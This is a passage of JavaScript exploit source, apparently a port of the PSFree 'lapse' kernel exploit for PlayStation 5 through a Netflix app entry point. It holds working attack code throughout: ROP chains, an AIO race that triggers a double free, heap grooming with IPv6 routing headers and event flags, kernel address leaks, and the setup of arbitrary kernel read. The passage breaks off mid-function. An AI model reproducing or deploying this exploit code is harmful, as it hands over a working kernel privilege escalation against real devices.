        if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
            return false;
        }

        block_fd = read32_uncompressed(sockpair);
        unblock_fd = read32_uncompressed(sockpair + 4n);
        logger.log("Created socketpair: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);

        const block_reqs = malloc(0x28 * NUM_WORKERS);
        for (let i = 0; i < NUM_WORKERS; i++) {
            const offset = i * 0x28;
            write32_uncompressed(block_reqs + BigInt(offset + 0x08), 1n);
            write32_uncompressed(block_reqs + BigInt(offset + 0x20), block_fd);
        }

        const block_id_buf = malloc(4);
        if (aio_submit_cmd(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3n, block_id_buf) !== 0n) {
            return false;
        }

        block_id = read32_uncompressed(block_id_buf);
        logger.log("AIO workers blocked with ID: " + block_id);
        logger.flush();
        
        const num_reqs = 3;
        const groom_reqs = make_reqs1(num_reqs);
        const groom_ids_addr = malloc(4 * NUM_GROOMS);
        
        spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
        cancel_aios(groom_ids_addr, NUM_GROOMS);
        
        groom_ids = [];
        for (let i = 0; i < NUM_GROOMS; i++) {
            groom_ids.push(Number(read32_uncompressed(groom_ids_addr + BigInt(i * 4))));
        }
        
        sds = [];
        for (let i = 0; i < NUM_SDS; i++) {
            sds.push(new_socket());
        }
        
        sds_alt = [];
        for (let i = 0; i < NUM_SDS_ALT; i++) {
            sds_alt.push(new_socket());
        }
        
        return true;

    } catch (e) {
        logger.log("Setup failed: " + e.message);
        logger.flush();
        return false;
    }
}

function double_free_reqs2() {
    try {
        const server_addr = malloc(16);
        write8_uncompressed(server_addr + 1n, AF_INET);
        write16_uncompressed(server_addr + 2n, 0n);
        write32_uncompressed(server_addr + 4n, BigInt(aton("127.0.0.1")));

        const sd_listen = new_tcp_socket();

        const enable = malloc(4);
        write32_uncompressed(enable, 1n);
        set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

        if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
            logger.log("bind failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }

        const addr_len = malloc(4);
        write32_uncompressed(addr_len, 16n);
        if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
            logger.log("getsockname failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }
        logger.log("Bound to port: " + Number(read16_uncompressed(server_addr + 2n)));

        if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
            logger.log("listen failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }
        
        const num_reqs = 3;
        const which_req = num_reqs - 1;
        const reqs = make_reqs1(num_reqs);
        const aio_ids = malloc(4 * num_reqs);
        const req_addr = aio_ids + BigInt(which_req * 4);
        const errors = malloc(4 * num_reqs);
        const cmd = AIO_CMD_MULTI_READ;

        for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
            logger.log("Race attempt " + attempt + "/" + NUM_RACES);

            const sd_client = new_tcp_socket();

            if (syscall(SYSCALL.connect, sd_client, server_addr, 16n) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                continue;
            }

            const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);

            const linger_buf = malloc(8);
            write32_uncompressed(linger_buf, 1n);
            write32_uncompressed(linger_buf + 4n, 1n);
            set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
            
            write32_uncompressed(reqs + BigInt(which_req * 0x28 + 0x20), sd_client);
            
            if (aio_submit_cmd(cmd, reqs, num_reqs, 3n, aio_ids) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                syscall(SYSCALL.close, sd_conn);
                continue;
            }

            aio_multi_cancel(aio_ids, num_reqs, errors);
            aio_multi_poll(aio_ids, num_reqs, errors);
            
            syscall(SYSCALL.close, sd_client);
            
            const sd_pair = race_one(req_addr, sd_conn, sds);

            aio_multi_delete(aio_ids, num_reqs, errors);
            syscall(SYSCALL.close, sd_conn);

            if (sd_pair !== null) {
                logger.log("Won race at attempt " + attempt);
                syscall(SYSCALL.close, sd_listen);
                return sd_pair;
            }
        }

        syscall(SYSCALL.close, sd_listen);
        return null;

    } catch (e) {
        logger.log("Stage 1 error: " + e.message);
        logger.flush();
        return null;
    }
}

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 1; loop <= NUM_ALIAS; loop++) {
        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                write32_uncompressed(buf + BigInt(marker_offset), BigInt(i));
                set_rthdr(sd, buf, rsize);
            }
        }

        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                get_rthdr(sd, buf, size);
                const marker = Number(read32_uncompressed(buf + BigInt(marker_offset)));
                
                if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                    const aliased_idx = marker - 1;
                    const aliased_sd = Number(sds[aliased_idx]);
                    if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
                        logger.log("Aliased rthdrs at attempt: " + loop);

                        const sd_pair = [sd, aliased_sd];
                        const max_idx = Math.max(i-1, aliased_idx);
                        const min_idx = Math.min(i-1, aliased_idx);
                        sds.splice(max_idx, 1);
                        sds.splice(min_idx, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        sds.push(new_socket());
                        return sd_pair;
                    }
                }
            }
        }
    }
    return null;
}

function race_one(req_addr, tcp_sd, sds) {
    try {
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        const sce_errs = malloc(8);
        write32_uncompressed(sce_errs, -1n);
        write32_uncompressed(sce_errs + 4n, -1n);

        const [pipe_read_fd, pipe_write_fd] = create_pipe();
        
        const fake_rop_race1 = new BigUint64Array(200);
        
        // fake_rop_race1[0] will be overwritten by longjmp, so skip it
        let rop_i = 1;

        const cpu_mask = malloc(0x10);
        write16_uncompressed(cpu_mask, BigInt(1 << MAIN_CORE));
        
        // Pin to core
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 3n;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = -1n;
        fake_rop_race1[rop_i++] = g.get('pop_rcx'); // pop rcx ; ret
        fake_rop_race1[rop_i++] = 0x10n;
        fake_rop_race1[rop_i++] = g.get('pop_r8'); // pop r8 ; ret
        fake_rop_race1[rop_i++] = cpu_mask;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        const rtprio_buf = malloc(4);
        write16_uncompressed(rtprio_buf, PRI_REALTIME);
        write16_uncompressed(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

        // Set priority
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.rtprio_thread;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 0n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = rtprio_buf;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // Signal ready
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = ready_signal;
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
        
        // Read from pipe (blocks here)
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.read;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = pipe_read_fd;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = pipe_buf;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // aio multi delete
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.aio_multi_delete;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = req_addr;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = sce_errs + 4n;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // Signal deletion
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = deletion_signal;
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

        // Thread exit
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.thr_exit;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 0n;
        fake_rop_race1[rop_i++] = syscall_wrapper;
        
        const thr_tid = spawn_thread(fake_rop_race1);
        
        wait_for(ready_signal, 1n);
        
        const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
        
        logger.log("Suspend result: " + hex(suspend_res));
        
        const poll_err = malloc(4);
        aio_multi_poll(req_addr, 1, poll_err);
        const poll_res = read32_uncompressed(poll_err);
        logger.log("Poll after suspend: " + hex(poll_res));

        const info_buf = malloc(0x100);
        const info_size = get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);
        
        if (info_size !== size_tcp_info) {
            logger.log("info size isn't " + size_tcp_info + ": " + info_size);
        }
        
        const tcp_state = read8_uncompressed(info_buf);
        logger.log("tcp_state: " + hex(tcp_state));
        
        let won_race = false;

        if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            aio_multi_delete(req_addr, 1, sce_errs);
            won_race = true;
            logger.log("Race won!");
        } else {
            logger.log("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
        }

        const resume_result = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
        logger.log("Resume " + hex(thr_tid) + ": " + resume_result);
        logger.flush();
        
        wait_for(deletion_signal, 1n);

        if (won_race) {
            const err_main_thr = read32_uncompressed(sce_errs);
            const err_worker_thr = read32_uncompressed(sce_errs + 4n);
            logger.log("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));

            if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
                logger.log("Double-free successful, making aliased rthdrs...");
                const sd_pair = make_aliased_rthdrs(sds);
                
                if (sd_pair !== null) {
                    syscall(SYSCALL.close, pipe_read_fd);
                    syscall(SYSCALL.close, pipe_write_fd);
                    return sd_pair;
                } else {
                    logger.log("Failed to make aliased rthdrs");
                }
            } else {
                logger.log("sce_errs mismatch - race failed");
            }
        }

        syscall(SYSCALL.close, pipe_read_fd);
        syscall(SYSCALL.close, pipe_write_fd);
        return null;

    } catch (e) {
        logger.log("Race error: " + e.message);
        logger.log(e.stack);
        logger.flush();
        return null;
    }
}

logger.log("Init lapse_prepare_2.js");/***** lapse.js *****/
/*
    Copyright (C) 2025 Gezine
    Copyright (C) 2025 anonymous
    
    This file `lapse.js` contains a derivative work of `lapse.mjs`, which is a
    part of PSFree.

    Source:
    https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
    https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
/*
    This payload is a port for 'Netflix n Hack' of lapse.js from Y2JB project by Gezine
    Use at your own risk
*/

(function() {
    try {

        logger.log("Init lapse_nf.js");

        const lapse_version = "Netflix n Hack - Lapse by Gezine";
        
        const failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";
        
        function new_evf(name, flags) {
            const result = syscall(SYSCALL.evf_create, name, 0n, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_create error: " + hex(result));
            }
            return result;
        }

        function set_evf_flags(id, flags) {
            let result = syscall(SYSCALL.evf_clear, id, 0n);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_clear error: " + hex(result));
            }
            result = syscall(SYSCALL.evf_set, id, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_set error: " + hex(result));
            }
            return result;
        }

        function free_evf(id) {
            const result = syscall(SYSCALL.evf_delete, id);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_delete error: " + hex(result));
            }
            return result;
        }

        function verify_reqs2(addr, cmd) {
            if (read32_uncompressed(addr) !== cmd) {
                return false;
            }

            const heap_prefixes = [];

            for (let i = 0x10n; i <= 0x20n; i += 8n) {
                if (read16_uncompressed(addr + i + 6n) !== 0xffffn) {
                    return false;
                }
                heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
            }

            const state1 = Number(read32_uncompressed(addr + 0x38n));
            const state2 = Number(read32_uncompressed(addr + 0x3cn));
            if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
                return false;
            }

            if (read64_uncompressed(addr + 0x40n) !== 0n) {
                return false;
            }

            for (let i = 0x48n; i <= 0x50n; i += 8n) {
                if (read16_uncompressed(addr + i + 6n) === 0xffffn) {
                    if (read16_uncompressed(addr + i + 4n) !== 0xffffn) {
                        heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
                    }
                } else if (i === 0x50n || read64_uncompressed(addr + i) !== 0n) {
                    return false;
                }
            }

            if (heap_prefixes.length < 2) {
                return false;
            }

            const first_prefix = heap_prefixes[0];
            for (let idx = 1; idx < heap_prefixes.length; idx++) {
                if (heap_prefixes[idx] !== first_prefix) {
                    return false;
                }
            }

            return true;
        }

        function leak_kernel_addrs(sd_pair, sds) {
            
            const sd = sd_pair[0];
            const buflen = 0x80 * LEAK_LEN;
            const buf = malloc(buflen);

            logger.log("Confusing evf with rthdr...");

            const name = malloc(1);

            syscall(SYSCALL.close, BigInt(sd_pair[1]));

            let evf = null;
            for (let i = 1; i <= NUM_ALIAS; i++) {
                const evfs = [];

                for (let j = 1; j <= NUM_HANDLES; j++) {
                    const evf_flags = 0xf00n | (BigInt(j) << 16n);
                    evfs.push(new_evf(name, evf_flags));
                }

                get_rthdr(sd, buf, 0x80);

                const flag = Number(read32_uncompressed(buf));

                if ((flag & 0xf00) === 0xf00) {
                    const idx = (flag >>> 16) & 0xffff;
                    const expected_flag = BigInt(flag | 1);

                    evf = evfs[idx - 1];

                    set_evf_flags(evf, expected_flag);
                    get_rthdr(sd, buf, 0x80);

                    const val = read32_uncompressed(buf);
                    if (val === expected_flag) {
                        evfs.splice(idx - 1, 1);
                    } else {
                        evf = null;
                    }
                }

                for (let k = 0; k < evfs.length; k++) {
                    if (evf === null || evfs[k] !== evf) {
                        free_evf(evfs[k]);
                    }
                }

                if (evf !== null) {
                    logger.log("Confused rthdr and evf at attempt: " + i);
                    break;
                }
            }

            if (evf === null) {
                logger.log("Failed to confuse evf and rthdr");
                return null;
            }

            set_evf_flags(evf, 0xff00n);

            const kernel_addr = read64_uncompressed(buf + 0x28n);
            logger.log("\"evf cv\" string addr: " + hex(kernel_addr));

            const kbuf_addr = read64_uncompressed(buf + 0x40n) - 0x38n;
            logger.log("Kernel buffer addr: " + hex(kbuf_addr));

            const wbufsz = 0x80;
            const wbuf = malloc(wbufsz);
            const rsize = build_rthdr(wbuf, wbufsz);
            const marker_val = 0xdeadbeefn;
            const reqs3_offset = 0x10n;

            write32_uncompressed(wbuf + 4n, marker_val);
            write32_uncompressed(wbuf + reqs3_offset + 0n, 1n);   // .ar3_num_reqs
            write32_uncompressed(wbuf + reqs3_offset + 4n, 0n);   // .ar3_reqs_left
            write32_uncompressed(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE); // .ar3_state
            write8_uncompressed(wbuf + reqs3_offset + 0xcn, 0n);  // .ar3_done
            write32_uncompressed(wbuf + reqs3_offset + 0x28n, 0x67b0000n); // .ar3_lock.lock_object.lo_flags
            write64_uncompressed(wbuf + reqs3_offset + 0x38n, 1n); // .ar3_lock.lk_lock = LK_UNLOCKED

            const num_elems = 6;

            const ucred = kbuf_addr + 4n;
            const leak_reqs = make_reqs1(num_elems);
            write64_uncompressed(leak_reqs + 0x10n, ucred);

            const num_loop = NUM_SDS;
            const leak_ids_len = num_loop * num_elems;
            const leak_ids = malloc(4 * leak_ids_len);
            const step = BigInt(4 * num_elems);
            const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

            let reqs2_off = null;
            let fake_reqs3_off = null;
            let fake_reqs3_sd = null;

            for (let i = 1; i <= NUM_LEAKS; i++) {
                for (let j = 1; j <= num_loop; j++) {
                    write32_uncompressed(wbuf + 8n, BigInt(j));
                    aio_submit_cmd(cmd, leak_reqs, num_elems, 3n, leak_ids + (BigInt(j - 1) * step));
                    set_rthdr(Number(sds[j - 1]), wbuf, rsize);
                }
                
                get_rthdr(sd, buf, buflen);

                let sd_idx = null;
                reqs2_off = null;
                fake_reqs3_off = null;

                for (let off = 0x80; off < buflen; off += 0x80) {
                    const offset = BigInt(off);

                    if (reqs2_off === null && verify_reqs2(buf + offset, AIO_CMD_WRITE)) {
                        reqs2_off = off;
                    }

                    if (fake_reqs3_off === null) {
                        const marker = read32_uncompressed(buf + offset + 4n);
                        if (marker === marker_val) {
                            fake_reqs3_off = off;
                            sd_idx = Number(read32_uncompressed(buf + offset + 8n));
                        }
                    }
                }

                if (reqs2_off !== null && fake_reqs3_off !== null) {
                    logger.log("Found reqs2 and fake reqs3 at attempt: " + i);
                    fake_reqs3_sd = sds[sd_idx - 1];
                    sds.splice(sd_idx - 1, 1);
                    free_rthdrs(sds);
                    sds.push(new_socket());
                    break;
                }

                free_aios(leak_ids, leak_ids_len);
            }

            if (reqs2_off === null || fake_reqs3_off === null) {
                logger.log("Could not leak reqs2 and fake reqs3");
                logger.flush();
                return null;
            }

            logger.log("reqs2 offset: " + hex(BigInt(reqs2_off)));
            logger.log("fake reqs3 offset: " + hex(BigInt(fake_reqs3_off)));
            logger.flush();

            get_rthdr(sd, buf, buflen);
            
            const aio_info_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x18n);
            
            let reqs1_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x10n);
            reqs1_addr = reqs1_addr & ~0xffn;

            const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

            logger.log("reqs1_addr = " + hex(reqs1_addr));
            logger.log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

            logger.log("Searching for target_id...");
            logger.flush();

            let target_id = null;
            let to_cancel = null;
            let to_cancel_len = null;

            const errors = malloc(4 * num_elems);

            for (let i = 0; i < leak_ids_len; i += num_elems) {
                aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems, errors);
                get_rthdr(sd, buf, buflen);

                const state = read32_uncompressed(buf + BigInt(reqs2_off) + 0x38n);
                if (state === AIO_STATE_ABORTED) {
                    target_id = read32_uncompressed(leak_ids + BigInt(i * 4));
                    write32_uncompressed(leak_ids + BigInt(i * 4), 0n);

                    logger.log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
                    logger.flush();
                    const start = i + num_elems;
                    to_cancel = leak_ids + BigInt(start * 4);
                    to_cancel_len = leak_ids_len - start;

                    break;
                }
            }

            if (target_id === null) {
                logger.log("Target ID not found");
                logger.flush();
                return null;
            }

            cancel_aios(to_cancel, to_cancel_len);
            free_aios2(leak_ids, leak_ids_len);

            logger.log("Kernel addresses leaked successfully!");
            logger.flush();

            return {
                reqs1_addr: reqs1_addr,
                kbuf_addr: kbuf_addr,
                kernel_addr: kernel_addr,
                target_id: target_id,
                evf: evf,
                fake_reqs3_addr: fake_reqs3_addr,
                fake_reqs3_sd: fake_reqs3_sd,
                aio_info_addr: aio_info_addr
            };
        }

        function make_aliased_pktopts(sds) {
            const tclass = malloc(4);
            
            for (let loop = 0; loop < NUM_ALIAS; loop++) {
                for (let i = 0; i < sds.length; i++) {
                    write32_uncompressed(tclass, BigInt(i));
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                }
                
                for (let i = 0; i < sds.length; i++) {
                    get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = Number(read32_uncompressed(tclass));
                    
                    if (marker !== i) {
                        const sd_pair = [sds[i], sds[marker]];
                        logger.log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                        logger.flush();
                        if (marker > i) {
                            sds.splice(marker, 1);
                            sds.splice(i, 1);
                        } else {
                            sds.splice(i, 1);
                            sds.splice(marker, 1);
                        }
                        
                        for (let j = 0; j < 2; j++) {
                            const sock_fd = new_socket();
                            set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                            sds.push(sock_fd);
                        }
                        
                        return sd_pair;
                    }
                }
                
                for (let i = 0; i < sds.length; i++) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0);
                }
            }
            
            return null;
        }

        function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
            const max_leak_len = (0xff + 1) << 3;
            const buf = malloc(max_leak_len);
            
            const num_elems = MAX_AIO_IDS;
            const aio_reqs = make_reqs1(num_elems);
            
            const num_batches = 2;
            const aio_ids_len = num_batches * num_elems;
            const aio_ids = malloc(4 * aio_ids_len);
            
            logger.log("Overwriting rthdr with AIO queue entry...");
            logger.flush();
            let aio_not_found = true;
            free_evf(evf);
            
            for (let i = 0; i < NUM_CLOBBERS; i++) {
                spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
                
                const size_ret = get_rthdr(sd, buf, max_leak_len);
                const cmd = read32_uncompressed(buf);
                
                if (size_ret === 8n && cmd === AIO_CMD_READ) {
                    logger.log("Aliased at attempt " + i);
                    logger.flush();
                    aio_not_found = false;
                    cancel_aios(aio_ids, aio_ids_len);
                    break;
                }
                
                free_aios(aio_ids, aio_ids_len, true);
            }
            
            if (aio_not_found) {
                logger.log("Failed to overwrite rthdr");
                logger.flush();
                return null;
            }
            
            const reqs2_size = 0x80;
            const reqs2 = malloc(reqs2_size);
            const rsize = build_rthdr(reqs2, reqs2_size);
            
            write32_uncompressed(reqs2 + 4n, 5n); // ar2_ticket
            write64_uncompressed(reqs2 + 0x18n, reqs1_addr); // ar2_info
            write64_uncompressed(reqs2 + 0x20n, fake_reqs3_addr); // ar2_batch
            
            const states = malloc(4 * num_elems);
            const addr_cache = [];
            for (let i = 0; i < num_batches; i++) {
                addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
            }
            
            logger.log("Overwriting AIO queue entry with rthdr...");
            logger.flush();
            
            syscall(SYSCALL.close, BigInt(sd));
            sd = null;
            
            function overwrite_aio_entry_with_rthdr() {
                for (let i = 0; i < NUM_ALIAS; i++) {
                    for (let j = 0; j < sds.length; j++) {
                        set_rthdr(sds[j], reqs2, rsize);
                    }
                    
                    for (let batch = 0; batch < addr_cache.length; batch++) {
                        for (let j = 0; j < num_elems; j++) {
                            write32_uncompressed(states + BigInt(j * 4), -1n);
                        }
                        
                        aio_multi_cancel(addr_cache[batch], num_elems, states);
                        
                        let req_idx = -1;
                        for (let j = 0; j < num_elems; j++) {
                            const val = read32_uncompressed(states + BigInt(j * 4));
                            if (val === AIO_STATE_COMPLETE) {
                                req_idx = j;
                                break;
                            }
                        }
                        
                        if (req_idx !== -1) {
                            logger.log("Found req_id at batch " + batch + ", attempt " + i);
                            logger.flush();
                            
                            const aio_idx = batch * num_elems + req_idx;
                            const req_id_p = aio_ids + BigInt(aio_idx * 4);
                            const req_id = read32_uncompressed(req_id_p);
                            
                            aio_multi_poll(req_id_p, 1, states);
                            write32_uncompressed(req_id_p, 0n);
                            
                            return req_id;
                        }
                    }
                }
                
                return null;
            }
            
            const req_id = overwrite_aio_entry_with_rthdr();
            if (req_id === null) {
                logger.log("Failed to overwrite AIO queue entry");
                logger.flush();
                return null;
            }
            
            free_aios2(aio_ids, aio_ids_len);
            
            const target_id_p = malloc(4);
            write32_uncompressed(target_id_p, BigInt(target_id));
            
            aio_multi_poll(target_id_p, 1, states);
            
            const sce_errs = malloc(8);
            write32_uncompressed(sce_errs, -1n);
            write32_uncompressed(sce_errs + 4n, -1n);
            
            const target_ids = malloc(8);
            write32_uncompressed(target_ids, req_id);
            write32_uncompressed(target_ids + 4n, BigInt(target_id));
            
            logger.log("Triggering double free...");
            logger.flush();
            aio_multi_delete(target_ids, 2, sce_errs);
            
            logger.log("Reclaiming memory...");
            logger.flush();
            const sd_pair = make_aliased_pktopts(sds_alt);
            
            const err1 = read32_uncompressed(sce_errs);
            const err2 = read32_uncompressed(sce_errs + 4n);
            
            write32_uncompressed(states, -1n);
            write32_uncompressed(states + 4n, -1n);
            
            aio_multi_poll(target_ids, 2, states);
            
            let success = true;
            if (read32_uncompressed(states) !== SCE_KERNEL_ERROR_ESRCH) {
                logger.log("ERROR: Bad delete of corrupt AIO request");
                logger.flush();
                success = false;
            }
            
            if (err1 !== 0n || err1 !== err2) {
                logger.log("ERROR: Bad delete of ID pair");
                logger.flush();
                success = false;
            }
            
            if (!success) {
                logger.log("Double free failed");
                logger.flush();
                return null;
            }
            
            if (sd_pair === null) {
                logger.log("Failed to make aliased pktopts");
                logger.flush();
                return null;
            }
            
            return sd_pair;
        }

        function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
            try {
                const master_sock = pktopts_sds[0];
                const tclass = malloc(4);
                const off_tclass = 0xc0n;  // PS5 offset
                
                const pktopts_size = 0x100;
                const pktopts = malloc(pktopts_size);
                const rsize = build_rthdr(pktopts, pktopts_size);
                const pktinfo_p = reqs1_addr + 0x10n;
                
                // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
                write64_uncompressed(pktopts + 0x10n, pktinfo_p);
                
                logger.log("Overwriting main pktopts");
                logger.flush();
                let reclaim_sock = null;
                
                syscall(SYSCALL.close, pktopts_sds[1]);
                
                for (let i = 1; i <= NUM_ALIAS; i++) {
                    for (let j = 0; j < sds_alt.length; j++) {
                        write32_uncompressed(pktopts + off_tclass, 0x4141n | (BigInt(j) << 16n));
                        set_rthdr(sds_alt[j], pktopts, rsize);
                    }
                    
                    get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = read32_uncompressed(tclass);
                    if ((marker & 0xffffn) === 0x4141n) {
                        logger.log("Found reclaim socket at attempt: " + i);
                        logger.flush();
                        const idx = Number(marker >> 16n);
                        reclaim_sock = sds_alt[idx];
                        sds_alt.splice(idx, 1);
                        break;
                    }
                }
                
                if (reclaim_sock === null) {
                    logger.log("Failed to overwrite main pktopts");
                    logger.flush();
                    return null;
                }
                
                const pktinfo_len = 0x14;
                const pktinfo = malloc(pktinfo_len);
                write64_uncompressed(pktinfo, pktinfo_p);
                
                const read_buf = malloc(8);
                
                function slow_kread8(addr) {
                    const len = 8;
                    let offset = 0;
                    
                    while (offset < len) {
                        // pktopts.ip6po_nhinfo = addr + offset
                        write64_uncompressed(pktinfo + 8n, addr + BigInt(offset));
                        
                        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);
                        
                        if (n === 0n) {
                             write8_uncompressed(read_buf + BigInt(offset), 0n);
                            offset = offset + 1;
                        } else {
                            offset = offset + Number(n);
                        }
                    }
                    
                    return read64_uncompressed(read_buf);
                }
                
                const test_read = slow_kread8(kernel_addr);
                logger.log("slow_kread8(\"evf cv\"): " + hex(test_read));
                logger.flush();
                const kstr = read_cstring(read_buf);
                logger.log("*(\"evf cv\"): " + kstr);
                logger.flush();
                
                if (kstr !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Slow arbitrary kernel read achieved");
                logger.flush();
                
